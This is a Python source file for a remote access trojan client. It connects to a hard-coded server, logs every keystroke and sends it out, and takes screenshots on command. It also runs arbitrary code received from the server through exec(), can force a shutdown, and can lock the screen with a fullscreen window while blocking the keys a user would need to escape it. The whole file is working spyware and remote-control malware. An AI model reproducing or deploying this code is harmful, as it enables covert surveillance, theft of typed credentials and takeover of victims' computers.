import socket
import sys
import os
import pyautogui
import keyboard
import ctypes
from pynput.keyboard import Key, Listener
from _thread import start_new_thread as thread
from tkinter import (Tk, Label)

IP = '192.168.4.66'#the ip for serber, local ip
PORT = 31415
IMAGE_PORT = 31416 #this one is to send images seperatly as to not clog

KEYS_TO_BLOCK = [
    'tab',
    'ctrl',
    'alt',
    'win',
]
KEYS_TO_BLOCK += [f'f{i}' for i in range(1, 13)]
IMAGE = 'IMAGE'
RELATIVE_IMAGE_FILE_NAME = 'image.png'
KEY = 'KEY'
STOP_IMAGE = 'STOP_IMAGE'


class block_:
    '''
    global variables bad
    '''
    pass

block_window = Tk()
block_window.destroy()



def shutdown(message):
    '''
    shuts down the computer

    message: does nothing
    '''
    os.system("shutdown /s /f /t 0")

def execute(message):
    '''
    uses python's exec() function to execute the message

    message: the python code to execute
    '''
    exec(message[8:])

def block(message):
    '''
    makes a large topmost fullscreen window
    the window will stay there, preventing all user actions
    all keys in KEYS_TO_BLOCK will be blocked to prevent user from closing it

    message: the text to put on the block window (for example: 'go outside')
    '''
    try:
        block_window.winfo_exists() #fails = it has been destroyed
        server.send(b"MESSAGE Screen is already blocked")

    except:
        block_window.__init__()
        Label(block_window, text=message[6:], font='Calibri 60').pack(expand=1)
        block_window.attributes('-fullscreen', True)
        block_window.overrideredirect(1)
        block_window.attributes('-topmost', True)
        for i in KEYS_TO_BLOCK:
            keyboard.block_key(i)
        server.send(b"MESSAGE Screen has been blocked") #block

def unblock(message):
    '''
    closes the block window if there is one

    message: does nothing
    '''
    keyboard.unhook_all()
    try:
        block_window.destroy()
        server.send(b"MESSAGE Screen has been unblocked")
    except:
        server.send(b"MESSAGE Screen has already been unblocked so uh you did nothing")


def send_image(message):
    '''
    takes a screenshot of the full screen with pyautogui
    sends the screenshot along the server

    message: does nothing
    '''
    image = pyautogui.screenshot()
    image.save(RELATIVE_IMAGE_FILE_NAME)
    image_server.send(bytes(f'{IMAGE} {os.stat(RELATIVE_IMAGE_FILE_NAME).st_size}', 'utf-8'))
    img = open(RELATIVE_IMAGE_FILE_NAME, 'rb')
    
    print('Sending screenshot')
    while True:
        line = img.read(512)
        if not line:
            break
        image_server.send(line)
    print('Ending screenshot')
    img.close()  

ACTIONS = {
    "EXECUTE": execute,
    "SHUTDOWN": shutdown,
    "BLOCK": block,
    "UNBLOCK": unblock,
    "SCREENSHOT": send_image,
}




def on_press(key):
    '''
    sends to server what key has been pressed
    '''
    print('a key has been pressed')
    try:
        key = key.name
    except:
        pass
    server.send(bytes(f'{KEY} {key}|', 'utf-8'))

def on_release(key):
    '''
    dummy function for releasing a key
    '''
    print('a key has been released')
    #server.send(bytes(f'KEY {key}|', 'utf-8'))

def keylog(): #will start once program starts
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


thread(keylog, ())
      
def main():
    '''
    connects to the server, constantly recieves its messages
    does actions when message is recieved
    '''
    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((IP, PORT))

            
            image_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            image_server.connect((IP, IMAGE_PORT))
        except:
            continue
        
        while True:
            try:
                try:
                    block_window.update()
                    block_window.update_idletasks()
                except:
                    pass

                message = server.recv(2048)
                real = str(message)[2:-1]
                try:
                    ACTIONS[real.split()[0]](real)
                except Exception as e:
                    print(e)
                    print(real)
            except:
                break

if __name__ == '__main__':
    main()
